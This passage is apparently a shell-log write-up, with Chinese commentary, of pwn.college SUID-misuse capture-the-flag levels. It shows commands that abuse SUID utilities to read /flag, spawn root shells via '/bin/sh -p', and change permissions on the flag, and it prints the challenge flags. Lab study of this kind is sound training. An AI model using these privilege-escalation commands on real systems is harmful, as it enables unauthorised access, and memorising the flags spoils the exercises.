32 39 4e >mkpuD58cqvDe329N< 000020 57 6c 4f 36 31 41 39 2e 30 31 4d 31 45 44 4c 32 >WlO61A9.01M1EDL2< 000030 51 6a 4d 79 4d 7a 57 7d 0a >QjMyMzW}.< 000039 hacker@program-misuse-level-11:~$ \u770b\u4e86\u6587\u6863\u5c31\u4f1a\u4e86\uff0c\u8fd9\u4e2a\u547d\u4ee4\u76f4\u63a5\u5199\u5728\u6587\u6863\u91cc\u3002 pwn.college{sKG5mkpuD58cqvDe329NWlO61A9.01M1EDL2QjMyMzW} level12 Requires you to understand their output to derive the flag from it! Welcome to ./babysuid_level12! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/hd. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level12) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/hd! \u5947\u602a\u7684 hd \u5de5\u5177\uff0c\u5341\u516d\u8fdb\u5236\u7684\u3002 hacker@program-misuse-level-12:~$ hd /flag 00000000 70 77 6e 2e 63 6f 6c 6c 65 67 65 7b 6f 47 7a 69 |pwn.college{oGzi| 00000010 37 55 30 32 58 54 6c 5f 64 73 6e 50 43 77 73 42 |7U02XTl_dsnPCwsB| 00000020 52 38 6d 59 54 77 6d 2e 30 46 4e 31 45 44 4c 32 |R8mYTwm.0FN1EDL2| 00000030 51 6a 4d 79 4d 7a 57 7d 0a |QjMyMzW}.| 00000039 hacker@program-misuse-level-12:~$ man hd \u8fd9\u91cc\u5df2\u7ecf\u53ef\u4ee5\u76f4\u63a5\u590d\u5236\u4e86\uff0c\u4f46\u662f\u5e0c\u671b\u6709\u66f4\u7b80\u4fbf\u7684\u5f62\u52bf\uff0c\u53bb\u770b\u4e86\u6587\u6863\uff0c\u4f46\u662f\u6ca1\u592a\u7814\u7a76\u660e\u767d\uff0c\u778e\u6574\u4e86\u4e00\u4e2a\u8f93\u51fa hacker@program-misuse-level-12:~$ hd -f /flag hd: \"pwn.college{oGzi7U02XTl_dsnPCwsBR8mYTwm.0FN1EDL2QjMyMzW}\": bad format hacker@program-misuse-level-12:~$ level13 Requires you to understand their output to derive the flag from it! Welcome to ./babysuid_level13! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/xxd. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level13) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/xxd! xxd \uff0c\u662f\u4e2a\u4e8c\u8fdb\u5236\u7684\u5de5\u5177\u3002\u8fd9\u4e2a\u6211\u4f1a hacker@program-misuse-level-13:~$ xxd /flag 00000000: 7077 6e2e 636f 6c6c 6567 657b 4d56 2d59 pwn.college{MV-Y 00000010: 6e5f 3465 4777 6c63 6f49 5438 4a63 574a n_4eGwlcoIT8JcWJ 00000020: 6934 7764 2d53 692e 3056 4e31 4544 4c32 i4wd-Si.0VN1EDL2 00000030: 516a 4d79 4d7a 577d 0a QjMyMzW}. \u7136\u540e\u624b\u52a8\u590d\u5236... pwn.college{MV-Yn_4eGwlcoIT8JcWJi4wd-Si.0VN1EDL2QjMyMzW} level14 Requires you to understand their output to derive the flag from it! hacker@program-misuse-level-14:~$ sh file.sh Welcome to ./babysuid_level14! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/base32. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level14) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/base32! base32 \u90fd\u51fa\u6765\u4e86,\u5c31\u4e00\u4e2a\u53c2\u6570 -d hacker@program-misuse-level-14:~$ base32 /flag OB3W4LTDN5WGYZLHMV5UCT3NM4ZWGTLYK5YV6SCVOR2XC5CSMF4WM6LML5UWE4ZOGBWE4MKFIRGD EULKJV4U26SXPUFA==== hacker@program-misuse-level-14:~$ base32 /flag | base32 -d pwn.college{AOmg3cMxWq_HUtuqtRayfyl_ibs.0lN1EDL2QjMyMzW} hacker@program-misuse-level-14:~$ \u90a3\u6211\u731c\u4e0b\u4e00\u4e2a\u662fbase64 level15 Requires you to understand their output to derive the flag from it! hacker@program-misuse-level-15:~$ sh file.sh Welcome to ./babysuid_level15! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/base64. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level15) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/base64! hacker@program-misuse-level-15:~$ \u563f\u563f\uff0c\u679c\u7136 hacker@program-misuse-level-15:~$ base64 /flag | base64 -d pwn.college{QvvMGkZ_gpVBCBw1u5dYReqKajl.01N1EDL2QjMyMzW} hacker@program-misuse-level-15:~$ level16 Requires you to understand their output to derive the flag from it! hacker@program-misuse-level-16:~$ sh file.sh Welcome to ./babysuid_level16! This challenge is part of a series of programs that require you to understand their output to derive the flag from it. I just set the SUID bit on /usr/bin/split. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level16) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/split! split \u662f\u4e00\u4e2a\u5206\u5757\u7684\u5de5\u5177\uff0c\u4f46\u662f\u7531\u4e8e\u9898\u4e2d\u7684flag\u5f88\u5c0f\uff0c\u8fd8\u8fbe\u4e0d\u5230\u5b83\u9ed8\u8ba4\u7684\u9650\u5ea6\uff08\u9ed8\u8ba4\u53c2\u6570\u9700\u8981\u770b\u624b\u518c\uff09\uff0c\u56e0\u6b64\u5728\u8fd0\u884c split /flag \u4e4b\u540e\uff0c\u5c31\u4f1a\u5728\u6587\u4ef6\u5939\u4e4b\u4e0b\u6709\u4e2a\u8f93\u51fa\u6587\u4ef6\u3002 hacker@program-misuse-level-16:~$ cat xaa pwn.college{oqsgCLV3hcD9AXs5bELwauYQHup.0FO1EDL2QjMyMzW} \u5c0f\u603b\u7ed3\uff0c\u9664\u4e86\u6700\u8fd1\u57fa\u672c\u7684\u8fdb\u5236\u3001ascii\u7b49\uff0cbase32\u548cbase64\u6700\u597d\u53ef\u4ee5\u4e86\u89e3\u4e00\u4e0b\u8fd9\u4e24\u79cd\u7f16\u7801\u65b9\u5f0f level17 Forces you to understand different archive formats! hacker@program-misuse-level-17:~$ sh file.sh Welcome to ./babysuid_level17! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/gzip. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level17) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/gzip! \u725b\u9a6c\u7684 gzip \uff0c\u538b\u7f29\u548c\u89e3\u538b\u7f29\uff0c\u770b\u6765\u540e\u51e0\u4e2a\u90fd\u662f\u8fd9\u4e2a\u610f\u601d \u7136\u540e\u5f00\u59cb\u79d2\u9898 hacker@program-misuse-level-17:~$ gzip -f /flag -t hacker@program-misuse-level-17:~$ ls / bin challenge etc home lib32 libx32 mnt proc run srv tmp var boot dev flag.gz lib lib64 media opt root sbin sys usr hacker@program-misuse-level-17:~$ gzip -cd /flag.gz pwn.college{QHVq0GV7-f7QFzzNe2jTzkeq6T8.0VO1EDL2QjMyMzW} hacker@program-misuse-level-17:~$ level18 Forces you to understand different archive formats! \u5f00\u59cb\u65e0\u804a\u8d77\u6765\u4e86\u3002\u3002\u3002 hacker@program-misuse-level-18:~$ sh file.sh Welcome to ./babysuid_level18! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/bzip2. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level18) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/bzip2! \u7136\u540e\u548c\u4e0a\u9762\u7684\u547d\u4ee4\u5b8c\u5168\u4e00\u6837\uff0c\u5c31\u662f\u538b\u7f29\u7684\u683c\u5f0f\u548c\u7b97\u6cd5\u4e0d\u540c\u4e86 hacker@program-misuse-level-18:~$ bzip2 -f /flag hacker@program-misuse-level-18:~$ ls / bin challenge etc home lib32 libx32 mnt proc run srv tmp var boot dev flag.bz2 lib lib64 media opt root sbin sys usr hacker@program-misuse-level-18:~$ bzip2 -cd /flag.bz2 pwn.college{wkf3JjpEoyTnVUz5mUbAtllNMRn.0FM2EDL2QjMyMzW} hacker@program-misuse-level-18:~$ level19 Forces you to understand different archive formats! Welcome to ./babysuid_level19! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/zip. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level19) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/zip! \u8fd9\u51e0\u4e2a\u9898\u53ef\u6709\u70b9\u513f\u70e6\u4eba\u4e86\u554a\uff01 hacker@program-misuse-level-19:~$ cat /flag.zip PK V3199flagUT \ufffddBdux pwn.college{YFFLGakdSzjIgW7btl64EaiEyDf.0VM2EDL2QjMyMzW} PK V3199flagUT\ufffddux PKJwhacker@program-misuse-level-19:~$ \u6b63\u786e\u7684\u65b9\u5f0f\u5e94\u8be5\u662f\u5148\u89e3\u538b\uff0c\u4f46\u662f\u8c8c\u4f3c\u80fd\u76f4\u63a5\u770b\uff0c\u6211\u5c31\u6ca1\u7ba1 level20 Forces you to understand different archive formats! hacker@program-misuse-level-20:~$ sh file.sh Welcome to ./babysuid_level20! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/tar. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level20) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/tar! tar \u6bd4\u8f83\u5e38\u89c1\u3002 hacker@program-misuse-level-20:~$ tar cf /flag.tar /flag tar: Removing leading `/' from member names hacker@program-misuse-level-20:~$ ls / bin challenge etc flag.tar lib lib64 media opt root sbin sys usr boot dev flag home lib32 libx32 mnt proc run srv tmp var hacker@program-misuse-level-20:~$ cat /flag.tar flag0000400000000000000000000000007114456374677010423 0ustar rootrootpwn.college{YNojFHYmMjDXxa2MP_mFcpOEIIo.0lM2EDL2QjMyMzW} hacker@program-misuse-level-20:~$ \u597d\u50cf\u90fd\u53ef\u4ee5\u76f4\u63a5\u7528cat\u770b\u538b\u7f29\u5305\uff0c\u90a3\u4e48\u5c31\u6bd4\u8f83\u7b80\u5355\u4e86 level21 Forces you to understand different archive formats! hacker@program-misuse-level-21:~$ sh file.sh Welcome to ./babysuid_level21! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/ar. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level21) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ar! ar \u5de5\u5177\uff0c\u96c6\u5408\u5f88\u591a\u6587\u6863\u5b58\u6210\u4e00\u4e2a\u6587\u6863\u7684\u5de5\u5177 hacker@program-misuse-level-21:~$ ar rs /flag.a /flag ar: creating /flag.a hacker@program-misuse-level-21:~$ cat /flag.a !<arch> flag/ 0 0 0 644 57 ` pwn.college{0vq28yii-jRYCSQP_DtM3bkf8ee.01M2EDL2QjMyMzW} hacker@program-misuse-level-21:~$ level22 Forces you to understand different archive formats! hacker@program-misuse-level-22:~$ sh file.sh Welcome to ./babysuid_level22! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/cpio. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level22) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/cpio! cpio \u5de5\u5177\uff0c\u7528\u4e8e\u6587\u4ef6\u5907\u4efd\u7684 hacker@program-misuse-level-22:~$ find /flag | cpio -ov > archive.cpio /flag 1 block hacker@program-misuse-level-22:~$ ls / bin challenge etc home lib32 libx32 mnt proc run srv tmp var boot dev flag lib lib64 media opt root sbin sys usr hacker@program-misuse-level-22:~$ ls Desktop Downloads Pictures Templates archive.cpio file.sh Documents Music Public Videos core test.py hacker@program-misuse-level-22:~$ cat archive.cpio \ufffdwd\ufffd9/flagpwn.college{om324dLj5vHeY7kTe9p_qAFQ1Cy.0FN2EDL2QjMyMzW} \ufffd TRAILER!!!hacker@program-misuse-level-22:~$ level23 Forces you to understand different archive formats! hacker@program-misuse-level-23:~$ sh file.sh Welcome to ./babysuid_level23! This challenge is part of a series of programs that force you to understand different archive formats. I just set the SUID bit on /usr/bin/genisoimage. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level23) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/genisoimage! genisoimage \u5de5\u5177\uff0c\u80fd\u770b\u51fa\u6765\u4f5c\u7528\u662f\u5efa\u7acbISO 9660\u6620\u50cf\u6587\u4ef6 er@program-misuse-level-23:~$ genisoimage -sort /flag genisoimage: Incorrect sort file format pwn.college{YROFw7Q_KvLF86Vs3WeI_XDvziT.0VN2EDL2QjMyMzW} hacker@program-misuse-level-23:~$ \u8fd9\u5757\u513f\u597d\u50cfcat\u4e0d\u592a\u661f\u4e86\uff0c\u8f93\u51fa\u4f1a\u6253\u4e71shell \u5c0f\u603b\u7ed3\uff1a\u5012\u662f\u77e5\u9053\u4e86\u5f88\u591a\u4ee5\u524d\u4e0d\u77e5\u9053\u7684\u5de5\u5177\u3002 level24 Enables you to read flags by making them execute other commands! sh hacker@program-misuse-level-24:~$ sh file.sh Welcome to ./babysuid_level24! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/env. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level24) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/env! \u5f00\u59cb\u6709\u610f\u601d\u8d77\u6765\u4e86\u3002 hacker@program-misuse-level-24:~$ env cat /flag pwn.college{8rPxiO1f2sBGHUvcT83glFWNSpM.0lN2EDL2QjMyMzW} hacker@program-misuse-level-24:~$ env\u53ef\u4ee5\u7ed9\u5176\u4ed6\u7684\u7a0b\u5e8f\u8d4b\u6743\uff1f\u611f\u89c9\u662f\u8fd9\u4e2a\u610f\u601d\uff0c\u5f53\u7136\u51fa\u9898\u4eba\u60f3\u8981\u7684\u610f\u601d\u5e94\u8be5\u662f\u9700\u8981\u5148\u8bbe\u4e00\u4e2ashell\uff0c\u7136\u540e\u6267\u884c\u3002 level25 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-25:~$ sh file.sh Welcome to ./babysuid_level25! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/find. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level25) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/find! \u4f7f\u7528find hacker@program-misuse-level-25:~$ find / -type f -name \"flag\" -exec cat {} \\; pwn.college{Uomlfru_u94ZuszsvlNzA0n6x39.01N2EDL2QjMyMzW} hacker@program-misuse-level-25:~$ \u8fd9\u91cc\u9700\u8981\u8003\u8651\u7684\u662ffind\u53ea\u662f\u627e\u5230\uff0c\u5982\u4f55\u8bfb\u53d6\uff1f \u4f7f\u7528 -exec level26 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-26:~$ sh file.sh Welcome to ./babysuid_level26! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/make. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level26) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/make! \u6709\u70b9\u513f\u610f\u601d\u554a\uff0c\u76f4\u63a5\u51fa\u73b0\u4e86GNU Make\u4e86 hacker@program-misuse-level-26:~$ COMMAND='cat /flag';make -s --eval=$'x:\\n\\t-'\"$COMMAND\" pwn.college{oYDGLL2PogQjUYR2TV30VTUm-4z.0FO2EDL2QjMyMzW} hacker@program-misuse-level-26:~$ \u8fd9\u4e2a\u641c\u4e86\u4e00\u4e0b\uff0c\u7136\u540e\u4e0d\u5149\u67e5\u5230\u4e86\u6b63\u786e\u7b54\u6848\u8fd8\u53d1\u73b0\u81ea\u5df1\u505a\u9519\u4e86\uff0c\u51fa\u9898\u4eba\u60f3\u8981\u7684\u662f sh -p \u8fd9\u6837\u63d0\u6743 \u8fd9\u4e2a\u547d\u4ee4\u7684\u4f5c\u7528\u662f\u542f\u52a8\u4e00\u4e2a\u65b0\u7684shell\u8fdb\u7a0b\uff0c\u5e76\u5c06\u8be5\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002 \u5177\u4f53\u6765\u8bf4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u5305\u542b\u4ee5\u4e0b\u90e8\u5206\uff1a env\uff1a\u8fd9\u662f\u4e00\u4e2a\u7528\u4e8e\u6267\u884c\u547d\u4ee4\u65f6\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u7684\u5de5\u5177\u3002\u5728\u8fd9\u4e2a\u547d\u4ee4\u4e2d\uff0c\u5b83\u7528\u4e8e\u5c06\u5f53\u524dshell\u8fdb\u7a0b\u7684\u6240\u6709\u73af\u5883\u53d8\u91cf\u4f20\u9012\u7ed9\u65b0\u7684shell\u8fdb\u7a0b\u3002 sh\uff1a\u8fd9\u662f\u4e00\u4e2a\u7528\u4e8e\u542f\u52a8shell\u8fdb\u7a0b\u7684\u547d\u4ee4\u3002\u5728\u8fd9\u4e2a\u547d\u4ee4\u4e2d\uff0c\u5b83\u7528\u4e8e\u542f\u52a8\u4e00\u4e2a\u65b0\u7684shell\u8fdb\u7a0b\u3002 -p\uff1a\u8fd9\u662f\u4e00\u4e2a\u9009\u9879\uff0c\u7528\u4e8e\u544a\u8bc9\u65b0\u7684shell\u8fdb\u7a0b\u5c06\u5176\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u4f1a\u5c06\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u4ece\u73af\u5883\u53d8\u91cf\u6587\u4ef6\uff08\u5982/etc/environment\u3001/etc/profile\u3001~/.bashrc\u7b49\uff09\u4e2d\u8bfb\u53d6\uff0c\u5e76\u5c06\u5176\u8bbe\u7f6e\u4e3a\u65b0\u7684shell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002 \u56e0\u6b64\uff0c\u8fd9\u4e2a\u547d\u4ee4\u7684\u6548\u679c\u662f\u542f\u52a8\u4e00\u4e2a\u65b0\u7684shell\u8fdb\u7a0b\uff0c\u5e76\u5c06\u5176\u73af\u5883\u53d8\u91cf\u8bbe\u7f6e\u4e3a\u5f53\u524dshell\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u3002\u8fd9\u53ef\u4ee5\u7528\u4e8e\u6d4b\u8bd5shell\u811a\u672c\u6216\u547d\u4ee4\u5bf9\u73af\u5883\u53d8\u91cf\u7684\u5f71\u54cd\uff0c\u6216\u8005\u5728\u4e24\u4e2a\u4e0d\u540c\u7684shell\u8fdb\u7a0b\u4e4b\u95f4\u5171\u4eab\u73af\u5883\u53d8\u91cf\u3002 \u770b\u8d77\u6765\u5c31\u662f\u8d4b\u6743\uff0c\u7136\u540e\u4f1a\u62ff\u5230\u4e00\u4e2a\u65b0\u7684shell\u63d0\u793a\u7b26 level27 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-27:~$ sh file.sh Welcome to ./babysuid_level27! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/nice. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level27) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/nice! nice \u5de5\u5177:\u7528\u4e8e\u4ee5\u6307\u5b9a\u7684\u8fdb\u7a0b\u8c03\u5ea6\u4f18\u5148\u7ea7\u542f\u52a8\u5176\u4ed6\u7684\u7a0b\u5e8f\u3002 hacker@program-misuse-level-27:~$ nice /bin/sh -p # cat /flag pwn.college{celMGA3nJomrVQwA5iPwIY2IORz.0VO2EDL2QjMyMzW} # \u8fd9\u6837\u624d\u662f\u9898\u76ee\u60f3\u8981\u7684\uff0c\u6211\u50bb\u4e86 level28 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-28:~$ sh file.sh Welcome to ./babysuid_level28! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/timeout. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level28) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/timeout! timeout \u5de5\u5177\uff1a\u7528\u6765\u6307\u5b9a\u65f6\u95f4\u540e\u6740\u6b7b\u8fdb\u7a0b\u7684\u3002 hacker@program-misuse-level-28:~$ timeout 1h /bin/sh -p # cat /flag pwn.college{sWxHBmerdB7TO79CXDlkRtygh4x.0FM3EDL2QjMyMzW} # \u8fd9\u4e2a\u9700\u8981\u6ce8\u610f\u6307\u5b9a\u4e00\u4e2a\u65f6\u95f4 level29 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-29:~$ sh file.sh Welcome to ./babysuid_level29! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/stdbuf. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level29) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/stdbuf! stdbuf \u5de5\u5177\uff1a\u4fee\u6539\u6807\u51c6\u6d41\u7684\u7f13\u51b2\u6a21\u5f0f\u548c\u5927\u5c0f hacker@program-misuse-level-29:~$ stdbuf --input=512K /bin/sh -p # cat /flag pwn.college{IHf3mOmt5d10g3StOZp5S0AMAfJ.0VM3EDL2QjMyMzW} # \u522b\u7528man\uff0c\u771f\u7684\u4e0d\u597d\u7528 level30 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-30:~$ sh file.sh Welcome to ./babysuid_level30! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/setarch. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level30) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/setarch! setarch \u5de5\u5177: \u6539\u53d8\u67b6\u6784\u7684\u5de5\u5177 hacker@program-misuse-level-30:~$ setarch i386 /bin/sh -p # cat /flag pwn.college{08T2qH86iHnjvFJb-5bmU9C5kJt.0lM3EDL2QjMyMzW} # \u5b83\u8fd9\u4e2a\u8bf4\u9ed8\u8ba4\u662f/bin/sh\uff0c\u53ef\u4ee5\u5207i386\uff0c\u5728man\u91cc\u5199\u7740\u5462 level31 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-31:~$ sh file.sh Welcome to ./babysuid_level31! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/watch. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level31) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/watch! watch \u5de5\u5177\uff1a\u6267\u884c\u547d\u4ee4\u7136\u540e\u5168\u5c4f\u8f93\u51fa hacker@program-misuse-level-31:~$ watch -x cat /flag ### \u4f7f\u7528\u540e\u4f1a\u8f93\u51fa\u5230\u5168\u5c4f pwn.college{UMl5SVp_YjbBiTIgIIiAi7i_5fg.01M3EDL2QjMyMzW} \u5f88\u795e\u5947\u7684\u5de5\u5177\uff0c\u7136\u800c\u53d1\u73b0tldr\u4e0d\u600e\u4e48\u5168\uff0c\u53ea\u6709\u5e38\u89c1\u547d\u4ee4\uff0c\u5230CTF\u7684\u73af\u5883\u4e4b\u4e2d\u5c31\u4e0d\u592a\u9002\u7528\u4e86 level32 Enables you to read flags by making them execute other commands! hacker@program-misuse-level-32:~$ sh file.sh Welcome to ./babysuid_level32! This challenge is part of a series of programs that will enable you to read flags by making them execute other commands. I just set the SUID bit on /usr/bin/socat. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level32) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/socat! socat \uff1a\u662f\u4e2a\u548csocket\u6709\u5173\u7684\u5de5\u5177\u3002 hacker@program-misuse-level-32:~$ socat -u \"file:/flag\" - pwn.college{QKHthQcoA6ncJKsiqFJMZ6ITybE.0FN3EDL2QjMyMzW} hacker@program-misuse-level-32:~$ level33 Requires some light programming to read the flag.! hacker@program-misuse-level-33:~$ sh file.sh Welcome to ./babysuid_level33! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/whiptail. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level33) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/whiptail! whiptail \uff1a\u5c55\u793ashell\u7684\u5bf9\u8bdd\u6846\u7684\u5de5\u5177 hacker@program-misuse-level-33:~$ whiptail --textbox /flag 20 40 pwn.college{4r_plp-YJyPyhT4_GiJQz042S5b.0VN3EDL2QjMyMzW} \u662f\u4e00\u4e2a\u6253\u5f00\u5bf9\u8bdd\u6846\u7684\u5de5\u5177\uff0c\u56e0\u6b64\u601d\u8def\u5c31\u662f\u76f4\u63a5\u5c55\u793a\u51fa\u6765\u5c31\u884c\u4e86\u3002 level34 Requires some light programming to read the flag.! hacker@program-misuse-level-34:~$ sh file.sh Welcome to ./babysuid_level34! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/awk. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level34) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/awk! \u8fd9\u6b21\u662f\u4e00\u4e2a\u6211\u4e00\u76f4\u90fd\u4e0d\u600e\u4e48\u4f1a\u7528\u7684\u5de5\u5177\u4e86\u3002\u3002\u3002\u4f60\u5988\u7684 hacker@program-misuse-level-34:~$ awk '{print $1}' /flag pwn.college{ghdjRlnfhKYn-uhIb2N76siNtG_.0lN3EDL2QjMyMzW} hacker@program-misuse-level-34:~$ awk \u662f\u4e00\u4e2a\u5f88\u6709\u7528\u7684\u5de5\u5177\uff0c\u6709\u65f6\u95f4\u8fd8\u662f\u5f97\u5b66\u4e00\u5b66 level35 Requires some light programming to read the flag.! hacker@program-misuse-level-35:~$ sh file.sh Welcome to ./babysuid_level35! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/sed. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level35) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/sed! \u679c\u7136\uff0c\u5728awk\u4e4b\u540e\u6211\u5c31\u5e94\u8be5\u60f3\u5230\u662fsed hacker@program-misuse-level-35:~$ sed p /flag pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW} pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW} hacker@program-misuse-level-35:~$ \u4e5f\u8bb8\u6211\u4e4b\u524d\u64cd\u4f5c\u9519\u4e86\u4ec0\u4e48\uff0c\u8fd9\u91cc\u4e0d\u5e94\u8be5\u662f\u4e24\u884cflag\u5427\uff1f level36 Requires some light programming to read the flag.! hacker@program-misuse-level-36:~$ sh file.sh Welcome to ./babysuid_level36! This challenge is part of a series of programs that will require some light programming to read the flag.. I just set the SUID bit on /usr/bin/ed. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level36) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/ed! ed \u5de5\u5177\uff1a\u662f\u4e2a\u7f16\u8f91\u5668\uff0c\u662f\u4ea4\u4e92\u5f0f\u7684 hacker@program-misuse-level-36:~$ ed /flag 57 .p pwn.college{QNXzpWhqr3e12Okfu2KRnY5jyxa.0FO3EDL2QjMyMzW} \u663e\u793a\u5168\u6587 level37 Lets you get the flag by doing tricks with permissions! hacker@program-misuse-level-37:~$ sh file.sh Welcome to ./babysuid_level37! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/chown. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level37) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/chown! chown \u5de5\u5177\uff1a\u6539\u53d8\u6587\u4ef6\u7684\u6240\u6709\u8005\u548c\u7ec4\u7684 hacker@program-misuse-level-37:~$ chown hacker /flag hacker@program-misuse-level-37:~$ cat /flag pwn.college{49NDHOhwhBEwWccuPUHSxUU0RIE.0VO3EDL2QjMyMzW} hacker@program-misuse-level-37:~$ \u8fd9\u5c31\u662f\u7b80\u5355\u7684\u8d4b\u6743\u4e86 level38 Lets you get the flag by doing tricks with permissions! hacker@program-misuse-level-38:~$ sh file.sh Welcome to ./babysuid_level38! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/chmod. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level38) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/chmod! \u8fd9\u4e2a\uff0c\u6ca1\u4eba\u4e0d\u4f1a\u5427 hacker@program-misuse-level-38:~$ chmod 777 /flag hacker@program-misuse-level-38:~$ cat /flag pwn.college{UtH5piA32tLwQLpCFPRDXuFa98r.0FM4EDL2QjMyMzW} hacker@program-misuse-level-38:~$ level39 Lets you get the flag by doing tricks with permissions! hacker@program-misuse-level-39:~$ sh file.sh Welcome to ./babysuid_level39! This challenge is part of a series of programs that let you get the flag by doing tricks with permissions. I just set the SUID bit on /usr/bin/cp. Try to use it to read the flag! IMPORTANT: make sure to run me (./babysuid_level39) every time that you restart this challenge container to make sure that I set the SUID bit on /usr/bin/cp! \u4e00\u5f00\u59cb\u60f3\u641e\u4e2a\u786c\u94fe\u63a5\uff0c\u7136\u540e\u53d1\u73b0\u4e0d\u884c\uff0c\u7136\u540e\u8f93\u51fa\u5230 \u6807\u51c6\u8f93\u51fa\u6d41 